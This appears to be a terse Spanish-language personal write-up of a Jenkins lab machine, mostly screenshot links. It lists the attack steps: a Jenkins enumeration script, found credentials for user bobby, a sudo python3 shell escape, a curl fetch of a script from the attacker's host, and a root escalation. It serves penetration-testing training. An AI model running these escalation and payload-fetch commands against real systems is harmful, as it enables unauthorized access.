- --
- Tags: #ejptmachine #python3 #jenkins 
---

![Pasted image 20250130201032](../../Fotos/Pasted%20image%2020250130201032.png)

![Pasted image 20250130201111](../../Fotos/Pasted%20image%2020250130201111.png)

![Pasted image 20250130201238](../../Fotos/Pasted%20image%2020250130201238.png)

![Pasted image 20250131155358](../../Fotos/Pasted%20image%2020250131155358.png)

![Pasted image 20250131155430](../../Fotos/Pasted%20image%2020250131155430.png)

![Pasted image 20250131155452](../../Fotos/Pasted%20image%2020250131155452.png)

`python3 jenkins.py -u http://172.17.0.2:8080`

![Pasted image 20250131155954](../../Fotos/Pasted%20image%2020250131155954.png)

- Descubrimos el usuario bobby

![Pasted image 20250131160250](../../Fotos/Pasted%20image%2020250131160250.png)

- login: bobby   password: chocolate

![Pasted image 20250131160356](../../Fotos/Pasted%20image%2020250131160356.png)

![Pasted image 20250131162346](../../Fotos/Pasted%20image%2020250131162346.png)

`sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/sh")'`

![Pasted image 20250131162503](../../Fotos/Pasted%20image%2020250131162503.png)

![Pasted image 20250131162559](../../Fotos/Pasted%20image%2020250131162559.png)

![Pasted image 20250131162703](../../Fotos/Pasted%20image%2020250131162703.png)

El archivo script_backup.py no existe y como tenemos  acceso a python3 simplemente o modificamos el script.py de /opt o hacemos otro script tirando de gtfobins y ejecutamos para ser root.
- No podemos crear o modificar el script.py asique nos pasaremos la escalada de privilegios con python 3 levantando un servidor y pasando el archivo de la maquina atacante a la victima.

![Pasted image 20250131162842](../../Fotos/Pasted%20image%2020250131162842.png)

![Pasted image 20250131163437](../../Fotos/Pasted%20image%2020250131163437.png)

![Pasted image 20250131163538](../../Fotos/Pasted%20image%2020250131163538.png)

![Pasted image 20250131163748](../../Fotos/Pasted%20image%2020250131163748.png)

`curl -O http://192.168.1.190:8080/script2.py`

![Pasted image 20250131163742](../../Fotos/Pasted%20image%2020250131163742.png)

![Pasted image 20250131164025](../../Fotos/Pasted%20image%2020250131164025.png)

`sudo -u root /usr/bin/python3 /opt/script.py`

![Pasted image 20250131164047](../../Fotos/Pasted%20image%2020250131164047.png)

